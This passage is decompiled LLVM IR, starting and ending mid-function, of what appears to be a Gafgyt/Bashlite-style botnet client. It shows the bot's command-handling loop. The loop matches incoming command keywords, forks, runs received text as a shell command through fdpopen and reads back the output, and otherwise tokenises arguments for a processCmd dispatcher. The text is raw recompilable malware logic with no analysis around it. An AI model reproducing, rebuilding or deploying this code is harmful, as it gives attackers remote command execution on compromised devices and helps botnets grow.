  %v1_804d4b9 = inttoptr i32 %v2_804d4a3 to i32*
  %v2_804d4b9 = load i32, i32* %v1_804d4b9, align 4
  %v2_804d4bb = inttoptr i32 %v1_804d4a6 to i32*
  store i32 %v2_804d4b9, i32* %v2_804d4bb, align 4
  %v4_804d4bd = add i32 %storemerge16, 1
  br label %dec_label_pc_804d4c0

dec_label_pc_804d4c0:                             ; preds = %dec_label_pc_804d48d, %dec_label_pc_804d496
  %storemerge16 = phi i32 [ %v4_804d4bd, %dec_label_pc_804d496 ], [ %.pre, %dec_label_pc_804d48d ]
  %v0_804d4d4 = load i32, i32* @global_var_80584c8.31, align 8
  %v0_804d4da = load i32, i32* @global_var_80584cc.32, align 4
  %v10_804d4f2 = icmp eq i32 %v0_804d4da, 0
  br i1 %v10_804d4f2, label %dec_label_pc_804d4fa, label %dec_label_pc_804d496

dec_label_pc_804d4fa:                             ; preds = %dec_label_pc_804d4c0
  store i32 0, i32* @esi, align 4
  store i32 %v0_804d4d4, i32* @edi, align 4
  %v10_804d50e = icmp ult i32 %storemerge16, %v0_804d4d4
  br i1 %v10_804d50e, label %dec_label_pc_804d496, label %dec_label_pc_804d516

dec_label_pc_804d516:                             ; preds = %dec_label_pc_804d4fa
  %v2_804d519 = mul i32 %storemerge16, 4
  %v0_804d51e = load i32, i32* @global_var_805e754.33, align 4
  %v2_804d523 = add i32 %v2_804d519, -4
  %v1_804d526 = add i32 %v2_804d523, %v0_804d51e
  %v1_804d529 = inttoptr i32 %v1_804d526 to i32*
  store i32 0, i32* %v1_804d529, align 4
  %v0_804d52f = load i32, i32* @global_var_80584c8.31, align 8
  %v0_804d534 = load i32, i32* @global_var_80584cc.32, align 4
  %v1_804d53a = add i32 %v0_804d52f, -1
  %v4_804d53a = icmp ne i32 %v0_804d52f, 0
  %v2_804d53d = zext i1 %v4_804d53a to i32
  %v3_804d53d = add i32 %v0_804d534, -1
  %v4_804d53d = add i32 %v3_804d53d, %v2_804d53d
  store i32 %v1_804d53a, i32* @global_var_80584c8.31, align 8
  store i32 %v4_804d53d, i32* @global_var_80584cc.32, align 4
  %v2_804d55a = mul i32 %v1_804d53a, 4
  %v1_804d55d = add i32 %v2_804d55a, 4
  %v5_804d55d = icmp eq i32 %v2_804d55a, -4
  store i1 %v5_804d55d, i1* %cf.global-to-local, align 1
  store i32 %v1_804d55d, i32* %stack_var_-5888, align 4
  %v1_804d563 = call i32 @malloc(i32 %v1_804d55d)
  br label %dec_label_pc_804d596

dec_label_pc_804d574:                             ; preds = %dec_label_pc_804d596, %dec_label_pc_804d5d0
  %v2_804d577 = mul i32 %storemerge15, 4
  %v5_804d57c = add i32 %v2_804d577, %v1_804d563
  %v0_804d587 = load i32, i32* @global_var_805e754.33, align 4
  %v2_804d58c = add i32 %v0_804d587, %v2_804d577
  %v1_804d58f = inttoptr i32 %v2_804d58c to i32*
  %v2_804d58f = load i32, i32* %v1_804d58f, align 4
  %v2_804d591 = inttoptr i32 %v5_804d57c to i32*
  store i32 %v2_804d58f, i32* %v2_804d591, align 4
  %v4_804d593 = add i32 %storemerge15, 1
  br label %dec_label_pc_804d596

dec_label_pc_804d596:                             ; preds = %dec_label_pc_804d516, %dec_label_pc_804d574
  %storemerge15 = phi i32 [ %v4_804d593, %dec_label_pc_804d574 ], [ 0, %dec_label_pc_804d516 ]
  %v0_804d5aa = load i32, i32* @global_var_80584c8.31, align 8
  %v0_804d5b0 = load i32, i32* @global_var_80584cc.32, align 4
  %v10_804d5c8 = icmp eq i32 %v0_804d5b0, 0
  br i1 %v10_804d5c8, label %dec_label_pc_804d5d0, label %dec_label_pc_804d574

dec_label_pc_804d5d0:                             ; preds = %dec_label_pc_804d596
  store i32 0, i32* @esi, align 4
  store i32 %v0_804d5aa, i32* @edi, align 4
  %v10_804d5e4 = icmp ult i32 %storemerge15, %v0_804d5aa
  br i1 %v10_804d5e4, label %dec_label_pc_804d574, label %dec_label_pc_804d5ec

dec_label_pc_804d5ec:                             ; preds = %dec_label_pc_804d5d0
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_804d5ec = load i32, i32* @global_var_805e754.33, align 4
  store i32 %v0_804d5ec, i32* %stack_var_-5888, align 4
  %v1_804d5f4 = call i32 @free(i32 %v0_804d5ec)
  store i32 %v1_804d563, i32* @global_var_805e754.33, align 4
  br label %dec_label_pc_804d601

dec_label_pc_804d601:                             ; preds = %dec_label_pc_804d45b, %dec_label_pc_804d5ec
  br label %dec_label_pc_804d604

dec_label_pc_804d604:                             ; preds = %dec_label_pc_804da73, %dec_label_pc_804d601
  %storemerge14 = phi i32 [ %.pre, %dec_label_pc_804d601 ], [ 0, %dec_label_pc_804da73 ]
  %v1_804d60d = ashr i32 %storemerge14, 31
  %v0_804d614 = load i32, i32* @global_var_80584c8.31, align 8
  store i32 %v0_804d614, i32* @esi, align 4
  %v0_804d61a = load i32, i32* @global_var_80584cc.32, align 4
  store i32 %v0_804d61a, i32* @edi, align 4
  %v10_804d632 = icmp ult i32 %v1_804d60d, %v0_804d61a
  store i1 %v10_804d632, i1* %cf.global-to-local, align 1
  br i1 %v10_804d632, label %dec_label_pc_804d45b, label %dec_label_pc_804d63e

dec_label_pc_804d63e:                             ; preds = %dec_label_pc_804d604
  store i1 false, i1* %cf.global-to-local, align 1
  %v6_804d64a = icmp ugt i32 %v1_804d60d, %v0_804d61a
  br i1 %v6_804d64a, label %dec_label_pc_804d65e, label %dec_label_pc_804d64c

dec_label_pc_804d64c:                             ; preds = %dec_label_pc_804d63e
  %v10_804d652 = icmp ult i32 %storemerge14, %v0_804d614
  store i1 %v10_804d652, i1* %cf.global-to-local, align 1
  br i1 %v10_804d652, label %dec_label_pc_804d45b, label %dec_label_pc_804d65e

dec_label_pc_804d65e:                             ; preds = %dec_label_pc_804d64c, %dec_label_pc_804d63e
  %v0_804d661 = load i32, i32* @ebp, align 4
  %v2_804d661 = add i32 %v5_804da8e, -5736
  %v3_804d661 = add i32 %v2_804d661, %v0_804d661
  %v4_804d661 = inttoptr i32 %v3_804d661 to i8*
  store i8 0, i8* %v4_804d661, align 1
  store i32 %v2_804da73, i32* %stack_var_-5888, align 4
  %v2_804d672 = call i32 @trim(i8* %tmp121)
  store i32 %v2_804da73, i32* %stack_var_-5888, align 4
  %v4_804d688 = call i32 @strstr(i32 %v2_804da73, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805600a.108, i32 0, i32 0))
  %v7_804d695 = icmp ult i32 %v4_804d688, %v2_804da73
  store i1 %v7_804d695, i1* %cf.global-to-local, align 1
  %v12_804d695 = icmp eq i32 %v4_804d688, %v2_804da73
  br i1 %v12_804d695, label %dec_label_pc_804da73, label %dec_label_pc_804d69d

dec_label_pc_804d69d:                             ; preds = %dec_label_pc_804d65e
  store i32 %v2_804da73, i32* %stack_var_-5888, align 4
  %v4_804d6ae = call i32 @strstr(i32 %v2_804da73, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805612a.136, i32 0, i32 0))
  store i32 %v4_804d6ae, i32* @edx, align 4
  %v7_804d6bb = icmp ult i32 %v4_804d6ae, %v2_804da73
  store i1 %v7_804d6bb, i1* %cf.global-to-local, align 1
  %v12_804d6bb = icmp eq i32 %v4_804d6ae, %v2_804da73
  %v1_804d6bd = icmp eq i1 %v12_804d6bb, false
  br i1 %v1_804d6bd, label %dec_label_pc_804d6e5, label %dec_label_pc_804d6bf

dec_label_pc_804d6bf:                             ; preds = %dec_label_pc_804d69d
  %v4_804d6bf = add i32 %stack_var_-96.2.ph, 1
  store i32 ptrtoint ([20 x i8]* @global_var_8056133.137 to i32), i32* %stack_var_-5888, align 4
  %v1_804d6ca = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_8056133.137 to i32))
  store i32 %v1_804d6ca, i32* @eax, align 4
  %v9_804d6cf = icmp ult i32 %v4_804d6bf, 20
  store i1 %v9_804d6cf, i1* %cf.global-to-local, align 1
  %v7_804d6d3 = icmp sgt i32 %v4_804d6bf, 20
  br i1 %v7_804d6d3, label %dec_label_pc_804d6d9, label %dec_label_pc_804d3f3.outer

dec_label_pc_804d6d9:                             ; preds = %dec_label_pc_804d6bf
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_804d6e0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804d6e5

dec_label_pc_804d6e5:                             ; preds = %dec_label_pc_804d69d, %dec_label_pc_804d6d9
  %stack_var_-96.1 = phi i32 [ %stack_var_-96.2.ph, %dec_label_pc_804d69d ], [ %v4_804d6bf, %dec_label_pc_804d6d9 ]
  %v2_804d6f1 = load i8, i8* %tmp121, align 4
  %v6_804d6f4 = icmp ult i8 %v2_804d6f1, 33
  store i1 %v6_804d6f4, i1* %cf.global-to-local, align 1
  %v10_804d6f4 = icmp eq i8 %v2_804d6f1, 33
  %v1_804d6f6 = icmp eq i1 %v10_804d6f4, false
  br i1 %v1_804d6f6, label %dec_label_pc_804da73.outer, label %dec_label_pc_804d6fc

dec_label_pc_804d6fc:                             ; preds = %dec_label_pc_804d6e5
  %v2_804d70b128 = load i8, i8* %storemerge13127, align 1
  %v3_804d70e131 = icmp ult i8 %v2_804d70b128, 32
  store i1 %v3_804d70e131, i1* %cf.global-to-local, align 1
  %v7_804d70e135 = icmp eq i8 %v2_804d70b128, 32
  br i1 %v7_804d70e135, label %dec_label_pc_804d71c, label %dec_label_pc_804d712

dec_label_pc_804d705:                             ; preds = %dec_label_pc_804d712
  %v5_804d705 = add i32 %storemerge13.in137, 1
  %storemerge13 = inttoptr i32 %v5_804d705 to i8*
  %v2_804d70b = load i8, i8* %storemerge13, align 1
  %v3_804d70e = icmp ult i8 %v2_804d70b, 32
  store i1 %v3_804d70e, i1* %cf.global-to-local, align 1
  %v7_804d70e = icmp eq i8 %v2_804d70b, 32
  br i1 %v7_804d70e, label %dec_label_pc_804d71c, label %dec_label_pc_804d712

dec_label_pc_804d712:                             ; preds = %dec_label_pc_804d6fc, %dec_label_pc_804d705
  %storemerge13138 = phi i8* [ %storemerge13, %dec_label_pc_804d705 ], [ %storemerge13127, %dec_label_pc_804d6fc ]
  %storemerge13.in137 = phi i32 [ %v5_804d705, %dec_label_pc_804d705 ], [ %v1_804d6ff, %dec_label_pc_804d6fc ]
  %v2_804d715 = load i8, i8* %storemerge13138, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d718 = icmp eq i8 %v2_804d715, 0
  %v1_804d71a = icmp eq i1 %v4_804d718, false
  br i1 %v1_804d71a, label %dec_label_pc_804d705, label %dec_label_pc_804d71c

dec_label_pc_804d71c:                             ; preds = %dec_label_pc_804d705, %dec_label_pc_804d712, %dec_label_pc_804d6fc
  %storemerge13.lcssa = phi i8* [ %storemerge13127, %dec_label_pc_804d6fc ], [ %storemerge13138, %dec_label_pc_804d712 ], [ %storemerge13, %dec_label_pc_804d705 ]
  %v2_804d71f = load i8, i8* %storemerge13.lcssa, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d722 = icmp eq i8 %v2_804d71f, 0
  br i1 %v4_804d722, label %dec_label_pc_804da73.outer, label %dec_label_pc_804d72a

dec_label_pc_804d72a:                             ; preds = %dec_label_pc_804d71c
  store i8 0, i8* %storemerge13.lcssa, align 1
  %v3_804d74e = call i32 @_strlen(i8* %storemerge13127)
  %v6_804d755 = add i32 %v2_804da73, %v3_804d74e
  %v1_804d758 = add i32 %v6_804d755, 2
  %v5_804d758 = icmp ugt i32 %v6_804d755, -3
  store i1 %v5_804d758, i1* %cf.global-to-local, align 1
  %v5_804d75b = inttoptr i32 %v1_804d758 to i8*
  br label %dec_label_pc_804d785

dec_label_pc_804d760:                             ; preds = %dec_label_pc_804d7ae, %dec_label_pc_804d785
  %v3_804d777 = call i32 @_strlen(i8* %v5_804d75b)
  %v4_804d777 = mul i32 %v3_804d777, -1
  %v1_804d77d = sub i32 0, %v4_804d777
  %v6_804d77e = sub i32 %v1_804d758, %v4_804d777
  %v11_804d77e = icmp ult i32 %v6_804d77e, %v1_804d77d
  store i1 %v11_804d77e, i1* %cf.global-to-local, align 1
  %v1_804d781 = add i32 %v6_804d77e, -1
  %v1_804d782 = inttoptr i32 %v1_804d781 to i8*
  store i8 0, i8* %v1_804d782, align 1
  br label %dec_label_pc_804d785

dec_label_pc_804d785:                             ; preds = %dec_label_pc_804d72a, %dec_label_pc_804d760
  %v3_804d79c = call i32 @_strlen(i8* %v5_804d75b)
  %v4_804d79c = mul i32 %v3_804d79c, -1
  %v1_804d7a2 = sub i32 0, %v4_804d79c
  %v6_804d7a3 = sub i32 %v1_804d758, %v4_804d79c
  %v11_804d7a3 = icmp ult i32 %v6_804d7a3, %v1_804d7a2
  store i1 %v11_804d7a3, i1* %cf.global-to-local, align 1
  %v1_804d7a6 = add i32 %v6_804d7a3, -1
  %v1_804d7a7 = inttoptr i32 %v1_804d7a6 to i8*
  %v2_804d7a7 = load i8, i8* %v1_804d7a7, align 1
  %v6_804d7aa = icmp ult i8 %v2_804d7a7, 10
  store i1 %v6_804d7aa, i1* %cf.global-to-local, align 1
  %v10_804d7aa = icmp eq i8 %v2_804d7a7, 10
  br i1 %v10_804d7aa, label %dec_label_pc_804d760, label %dec_label_pc_804d7ae

dec_label_pc_804d7ae:                             ; preds = %dec_label_pc_804d785
  %v3_804d7c5 = call i32 @_strlen(i8* %v5_804d75b)
  %v4_804d7c5 = mul i32 %v3_804d7c5, -1
  %v1_804d7cb = sub i32 0, %v4_804d7c5
  %v6_804d7cc = sub i32 %v1_804d758, %v4_804d7c5
  %v11_804d7cc = icmp ult i32 %v6_804d7cc, %v1_804d7cb
  store i1 %v11_804d7cc, i1* %cf.global-to-local, align 1
  %v1_804d7cf = add i32 %v6_804d7cc, -1
  %v1_804d7d0 = inttoptr i32 %v1_804d7cf to i8*
  %v2_804d7d0 = load i8, i8* %v1_804d7d0, align 1
  %v6_804d7d3 = icmp ult i8 %v2_804d7d0, 13
  store i1 %v6_804d7d3, i1* %cf.global-to-local, align 1
  %v10_804d7d3 = icmp eq i8 %v2_804d7d0, 13
  br i1 %v10_804d7d3, label %dec_label_pc_804d760, label %dec_label_pc_804d7d7

dec_label_pc_804d7d7:                             ; preds = %dec_label_pc_804d7ae
  %v2_804d7e5143 = load i8, i8* %v5_804d75b, align 1
  %v3_804d7e8146 = icmp ult i8 %v2_804d7e5143, 32
  store i1 %v3_804d7e8146, i1* %cf.global-to-local, align 1
  %v7_804d7e8150 = icmp eq i8 %v2_804d7e5143, 32
  br i1 %v7_804d7e8150, label %dec_label_pc_804d7f6, label %dec_label_pc_804d7ec

dec_label_pc_804d7df:                             ; preds = %dec_label_pc_804d7ec
  %v5_804d7df = add i32 %v4_804d7e2153, 1
  %v22_804d7df = inttoptr i32 %v5_804d7df to i8*
  %v2_804d7e5 = load i8, i8* %v22_804d7df, align 1
  %v3_804d7e8 = icmp ult i8 %v2_804d7e5, 32
  store i1 %v3_804d7e8, i1* %cf.global-to-local, align 1
  %v7_804d7e8 = icmp eq i8 %v2_804d7e5, 32
  br i1 %v7_804d7e8, label %dec_label_pc_804d7f6, label %dec_label_pc_804d7ec

dec_label_pc_804d7ec:                             ; preds = %dec_label_pc_804d7d7, %dec_label_pc_804d7df
  %v4_804d7e2153 = phi i32 [ %v5_804d7df, %dec_label_pc_804d7df ], [ %v1_804d758, %dec_label_pc_804d7d7 ]
  %stack_var_-64.0152 = phi i8* [ %v22_804d7df, %dec_label_pc_804d7df ], [ %v5_804d75b, %dec_label_pc_804d7d7 ]
  %v2_804d7ef = load i8, i8* %stack_var_-64.0152, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d7f2 = icmp eq i8 %v2_804d7ef, 0
  %v1_804d7f4 = icmp eq i1 %v4_804d7f2, false
  br i1 %v1_804d7f4, label %dec_label_pc_804d7df, label %dec_label_pc_804d7f6

dec_label_pc_804d7f6:                             ; preds = %dec_label_pc_804d7df, %dec_label_pc_804d7ec, %dec_label_pc_804d7d7
  %stack_var_-64.0.lcssa = phi i8* [ %v5_804d75b, %dec_label_pc_804d7d7 ], [ %stack_var_-64.0152, %dec_label_pc_804d7ec ], [ %v22_804d7df, %dec_label_pc_804d7df ]
  %v4_804d7e2.lcssa = phi i32 [ %v1_804d758, %dec_label_pc_804d7d7 ], [ %v4_804d7e2153, %dec_label_pc_804d7ec ], [ %v5_804d7df, %dec_label_pc_804d7df ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v5_804d7fc = add i32 %v4_804d7e2.lcssa, 1
  %v2_804d825159 = load i8, i8* %v5_804d75b, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d828161 = icmp eq i8 %v2_804d825159, 0
  %v1_804d82a163 = icmp eq i1 %v4_804d828161, false
  br i1 %v1_804d82a163, label %dec_label_pc_804d807, label %dec_label_pc_804d82c

dec_label_pc_804d807:                             ; preds = %dec_label_pc_804d7f6, %dec_label_pc_804d807
  %storemerge12165 = phi i8* [ %storemerge12, %dec_label_pc_804d807 ], [ %v5_804d75b, %dec_label_pc_804d7f6 ]
  %storemerge12.in164 = phi i32 [ %v5_804d81f, %dec_label_pc_804d807 ], [ %v1_804d758, %dec_label_pc_804d7f6 ]
  %v2_804d80a = load i8, i8* %storemerge12165, align 1
  %v3_804d80a = zext i8 %v2_804d80a to i32
  store i32 %v3_804d80a, i32* %stack_var_-5888, align 4
  %v1_804d813 = call i32 @__GI_toupper(i32 %v3_804d80a)
  %v1_804d818 = urem i32 %v1_804d813, 256
  %v2_804d818 = load i32, i32* @edx, align 4
  %v3_804d818 = and i32 %v2_804d818, -256
  %v4_804d818 = or i32 %v3_804d818, %v1_804d818
  store i32 %v4_804d818, i32* @edx, align 4
  %v1_804d81d = trunc i32 %v1_804d813 to i8
  store i8 %v1_804d81d, i8* %storemerge12165, align 1
  %v5_804d81f = add i32 %storemerge12.in164, 1
  %storemerge12 = inttoptr i32 %v5_804d81f to i8*
  %v2_804d825 = load i8, i8* %storemerge12, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d828 = icmp eq i8 %v2_804d825, 0
  %v1_804d82a = icmp eq i1 %v4_804d828, false
  br i1 %v1_804d82a, label %dec_label_pc_804d807, label %dec_label_pc_804d82c

dec_label_pc_804d82c:                             ; preds = %dec_label_pc_804d807, %dec_label_pc_804d7f6
  store i1 false, i1* @df, align 1
  store i32 %v1_804d758, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8056147.138 to i32), i32* @edi, align 4
  %v7_804d85c = call i32 @_strncmp(i8* %v5_804d75b, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8056147.138, i32 0, i32 0), i32 11)
  %v8_804d85c = urem i32 %v7_804d85c, 2
  %v9_804d85c = icmp eq i32 %v8_804d85c, 0
  %v0_804d85e = load i1, i1* %cf.global-to-local, align 1
  %v2_804d85e = or i1 %v0_804d85e, %v9_804d85c
  %v3_804d85e = zext i1 %v2_804d85e to i32
  %v4_804d85e = load i32, i32* @edx, align 4
  %v5_804d85e = and i32 %v4_804d85e, -256
  %v6_804d85e = or i32 %v3_804d85e, %v5_804d85e
  %v7_804d85e = xor i32 %v6_804d85e, 1
  store i32 %v7_804d85e, i32* @edx, align 4
  %v3_804d864 = and i32 %v7_804d85c, -256
  %v1_804d866 = trunc i32 %v7_804d85e to i8
  %v3_804d866 = zext i1 %v0_804d85e to i8
  %v4_804d866 = sub nsw i8 %v1_804d866, %v3_804d866
  %v15_804d866 = icmp eq i8 %v4_804d866, 0
  %v20_804d866 = zext i8 %v4_804d866 to i32
  %v23_804d866 = or i32 %v20_804d866, %v3_804d864
  store i32 %v23_804d866, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d86f = icmp eq i1 %v15_804d866, false
  br i1 %v1_804d86f, label %dec_label_pc_804d950, label %dec_label_pc_804d875

dec_label_pc_804d875:                             ; preds = %dec_label_pc_804d82c
  %v0_804d875 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d87a = icmp eq i32 %v0_804d875, 0
  %v1_804d87c = icmp eq i1 %v1_804d87a, false
  br i1 %v1_804d87c, label %dec_label_pc_804da73.outer, label %dec_label_pc_804d882

dec_label_pc_804d882:                             ; preds = %dec_label_pc_804d875
  store i32 %v2_804d882, i32* %stack_var_-5888, align 4
  %v5_804d89e = call i32 @__GI_memset(i8* %v4_804d89e, i32 0, i32 1024)
  store i32 %v2_804d882, i32* %stack_var_-5888, align 4
  %v4_804d8bc = call i32 @szprintf(i32 %v2_804d882, i32 ptrtoint ([8 x i8]* @global_var_8056152.139 to i32), i32 %v5_804d7fc)
  store i32 %v2_804d882, i32* %stack_var_-5888, align 4
  %v4_804d8d3 = call i32 @fdpopen(i32 %v2_804d882, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_805609d.129, i32 0, i32 0))
  store i32 %v2_804d882, i32* %stack_var_-5888, align 4
  %v4_804d930166 = call i32 @fdgets(i32 %v2_804d882, i32 1024, i32 %v4_804d8d3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d935167 = icmp eq i32 %v4_804d930166, 0
  %v1_804d937169 = icmp eq i1 %v1_804d935167, false
  br i1 %v1_804d937169, label %dec_label_pc_804d8dd, label %dec_label_pc_804d939

dec_label_pc_804d8dd:                             ; preds = %dec_label_pc_804d882, %dec_label_pc_804d8dd
  store i32 %v2_804d882, i32* %stack_var_-5888, align 4
  %v2_804d8e6 = call i32 @trim(i8* %v4_804d89e)
  store i32 %v2_804d882, i32* %stack_var_-5888, align 4
  %v5_804d907 = call i32 @__GI_memset(i8* %v4_804d89e, i32 0, i32 1024)
  store i32 1, i32* %stack_var_-5888, align 4
  %v1_804d913 = call i32 @sleep(i32 1)
  store i32 %v2_804d882, i32* %stack_var_-5888, align 4
  %v4_804d930 = call i32 @fdgets(i32 %v2_804d882, i32 1024, i32 %v4_804d8d3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d935 = icmp eq i32 %v4_804d930, 0
  %v1_804d937 = icmp eq i1 %v1_804d935, false
  br i1 %v1_804d937, label %dec_label_pc_804d8dd, label %dec_label_pc_804d939

dec_label_pc_804d939:                             ; preds = %dec_label_pc_804d8dd, %dec_label_pc_804d882
  store i32 %v4_804d8d3, i32* %stack_var_-5888, align 4
  %v1_804d93f = call i32 @fdpclose(i32 %v4_804d8d3)
  store i32 %v1_804d93f, i32* @eax, align 4
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_804d94b = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804d950

dec_label_pc_804d950:                             ; preds = %dec_label_pc_804d82c, %dec_label_pc_804d939
  store i32 %v5_804d7fc, i32* @eax, align 4
  store i32 %v5_804d7fc, i32* %stack_var_-5888, align 4
  %v3_804d965 = call i32 @__GI_strtok(i32 %v5_804d7fc, i32 ptrtoint (i32* @global_var_805615a.140 to i32))
  %v5_804d96a = inttoptr i32 %v3_804d965 to i8*
  store i8* %v5_804d96a, i8** %stack_var_-36, align 4
  store i32 %v1_804d758, i32* %stack_var_-624, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804da2134 = icmp eq i32 %v3_804d965, 0
  %v1_804da2541 = icmp eq i1 %v5_804da2134, false
  br i1 %v1_804da2541, label %dec_label_pc_804d97b, label %dec_label_pc_804da2b

dec_label_pc_804d97b:                             ; preds = %dec_label_pc_804d950, %dec_label_pc_804da0a
  %v3_804d98c = phi i8* [ %tmp124, %dec_label_pc_804da0a ], [ %v5_804d96a, %dec_label_pc_804d950 ]
  %stack_var_-40.142 = phi i32 [ %stack_var_-40.0, %dec_label_pc_804da0a ], [ 1, %dec_label_pc_804d950 ]
  %v2_804d97e = load i8, i8* %v3_804d98c, align 1
  %v3_804d97e = zext i8 %v2_804d97e to i32
  store i32 %v3_804d97e, i32* @eax, align 4
  %v6_804d981 = icmp ult i8 %v2_804d97e, 10
  store i1 %v6_804d981, i1* %cf.global-to-local, align 1
  %v10_804d981 = icmp eq i8 %v2_804d97e, 10
  br i1 %v10_804d981, label %dec_label_pc_804da0a, label %dec_label_pc_804d989

dec_label_pc_804d989:                             ; preds = %dec_label_pc_804d97b
  %v4_804d97b = ptrtoint i8* %v3_804d98c to i32
  store i32 %stack_var_-40.142, i32* @ebx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804d97b, i32* @edi, align 4
  %v3_804d9a3 = call i32 @_strlen(i8* %v3_804d98c)
  %v1_804d9a7 = add i32 %v3_804d9a3, 1
  store i32 %v1_804d9a7, i32* %stack_var_-5888, align 4
  %v1_804d9ae = call i32 @malloc(i32 %v1_804d9a7)
  %v1_804d9b3 = load i32, i32* @ebp, align 4
  %v2_804d9b3 = load i32, i32* @ebx, align 4
  %v3_804d9b3 = mul i32 %v2_804d9b3, 4
  %v4_804d9b3 = add i32 %v1_804d9b3, -616
  %v5_804d9b3 = add i32 %v4_804d9b3, %v3_804d9b3
  %v6_804d9b3 = inttoptr i32 %v5_804d9b3 to i32*
  store i32 %v1_804d9ae, i32* %v6_804d9b3, align 4
  %v3_804d9ba = load i8*, i8** %stack_var_-36, align 4
  %v4_804d9ba = ptrtoint i8* %v3_804d9ba to i32
  %v3_804d9d1 = call i32 @_strlen(i8* %v3_804d9ba)
  %v1_804d9d5 = add i32 %v3_804d9d1, 1
  %v0_804d9de = load i32, i32* @ebp, align 4
  %v2_804d9de = mul i32 %stack_var_-40.142, 4
  %v3_804d9de = add i32 %v2_804d9de, -616
  %v4_804d9de = add i32 %v0_804d9de, %v3_804d9de
  %v5_804d9de = inttoptr i32 %v4_804d9de to i32*
  %v6_804d9de = load i32, i32* %v5_804d9de, align 4
  %v1_804d9e5 = inttoptr i32 %v6_804d9de to i8*
  store i32 %v6_804d9de, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804d9ea = and i32 %v6_804d9de, -256
  %v5_804d9ec = call i8* @_memset(i8* %v1_804d9e5, i32 %v1_804d9ea, i32 %v1_804d9d5)
  %v6_804d9ec = ptrtoint i8* %v5_804d9ec to i32
  store i32 %v6_804d9ec, i32* @ecx, align 4
  %v0_804d9f4 = load i32, i32* @ebp, align 4
  %v4_804d9f4 = add i32 %v0_804d9f4, %v3_804d9de
  %v5_804d9f4 = inttoptr i32 %v4_804d9f4 to i32*
  %v6_804d9f4 = load i32, i32* %v5_804d9f4, align 4
  store i32 %v6_804d9f4, i32* @eax, align 4
  store i32 %v6_804d9f4, i32* %stack_var_-5888, align 4
  %v3_804da02 = inttoptr i32 %v6_804d9f4 to i8*
  %v4_804da02 = call i32 @strcpy(i8* %v3_804da02, i32 %v4_804d9ba)
  store i32 %v4_804da02, i32* @eax, align 4
  %v4_804da07 = add i32 %stack_var_-40.142, 1
  br label %dec_label_pc_804da0a

dec_label_pc_804da0a:                             ; preds = %dec_label_pc_804d97b, %dec_label_pc_804d989
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.142, %dec_label_pc_804d97b ], [ %v4_804da07, %dec_label_pc_804d989 ]
  store i32 0, i32* %stack_var_-5888, align 4
  %v3_804da19 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805615a.140 to i32))
  store i32 %v3_804da19, i32* %tmp122, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804da21 = icmp eq i32 %v3_804da19, 0
  %v1_804da25 = icmp eq i1 %v5_804da21, false
  %tmp124 = inttoptr i32 %v3_804da19 to i8*
  br i1 %v1_804da25, label %dec_label_pc_804d97b, label %dec_label_pc_804da2b

dec_label_pc_804da2b:                             ; preds = %dec_label_pc_804da0a, %dec_label_pc_804d950
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_804d950 ], [ %stack_var_-40.0, %dec_label_pc_804da0a ]
  store i32 %stack_var_-40.1.lcssa, i32* %stack_var_-5888, align 4
  %v4_804da3b = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v9_804da40 = icmp eq i32 %stack_var_-40.1.lcssa, 0
  store i1 %v9_804da40, i1* %cf.global-to-local, align 1
  %v7_804da44 = icmp sgt i32 %stack_var_-40.1.lcssa, 1
  br i1 %v7_804da44, label %dec_label_pc_804da56.lr.ph, label %dec_label_pc_804da73.outer

dec_label_pc_804da56.lr.ph:                       ; preds = %dec_label_pc_804da2b
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804da56

dec_label_pc_804da56:                             ; preds = %dec_label_pc_804da56.lr.ph, %dec_label_pc_804da56
  %storemerge179 = phi i32 [ 1, %dec_label_pc_804da56.lr.ph ], [ %v4_804da68, %dec_label_pc_804da56 ]
  %v0_804da59 = load i32, i32* @ebp, align 4
  %v2_804da59 = mul i32 %storemerge179, 4
  %v3_804da59 = add i32 %v2_804da59, -616
  %v4_804da59 = add i32 %v3_804da59, %v0_804da59
  %v5_804da59 = inttoptr i32 %v4_804da59 to i32*
  %v6_804da59 = load i32, i32* %v5_804da59, align 4
  store i32 %v6_804da59, i32* %stack_var_-5888, align 4
  %v1_804da63 = call i32 @free(i32 %v6_804da59)
  %v4_804da68 = add nuw i32 %storemerge179, 1
  %v10_804da6e = icmp ult i32 %v4_804da68, %stack_var_-40.1.lcssa
  store i1 %v10_804da6e, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_804da68, %stack_var_-40.1.lcssa
  br i1 %exitcond, label %dec_label_pc_804da73.outer, label %dec_label_pc_804da56

dec_label_pc_804da73.outer:                       ; preds = %dec_label_pc_804da56, %dec_label_pc_804d875, %dec_label_pc_804da2b, %dec_label_pc_804d71c, %dec_label_pc_804d6e5, %dec_label_pc_804d40a
